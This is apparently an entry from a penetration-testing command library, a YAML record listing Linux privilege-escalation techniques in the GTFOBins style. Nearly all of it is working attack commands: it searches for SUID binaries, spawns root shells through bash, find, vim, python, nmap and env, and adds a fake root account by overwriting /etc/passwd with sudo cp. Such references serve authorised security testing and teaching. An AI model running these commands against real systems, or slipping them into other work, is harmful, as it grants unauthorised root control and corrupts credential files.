---
description: |
  Exploit SUID/sudo binaries for Linux privilege escalation
  using GTFOBins techniques.
command: |
  # Find SUID binaries
  find / -perm -4000 -type f 2>/dev/null

  # Common SUID exploits:

  # bash (SUID)
  /bin/bash -p

  # find (SUID or sudo)
  find . -exec /bin/bash -p \;

  # vim (sudo)
  sudo vim -c ':!bash'

  # python (SUID or sudo)
  sudo python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

  # nmap (old versions with --interactive)
  sudo nmap --interactive
  !sh

  # cp/mv (sudo — overwrite /etc/passwd)
  openssl passwd -1 hacked
  echo 'root2:HASH:0:0:root:/root:/bin/bash' >> /tmp/passwd
  sudo cp /tmp/passwd /etc/passwd
  su root2

  # env/nice/ionice/timeout (sudo)
  sudo env /bin/bash

  # Check GTFOBins for any binary
  # https://gtfobins.github.io/
phase:
  - PrivEsc
target_os:
  - Linux
services: []
items:
  - Shell
techniques:
  - Linux_Misconfig
network_position:
  - Local
references:
  - https://gtfobins.github.io/
---
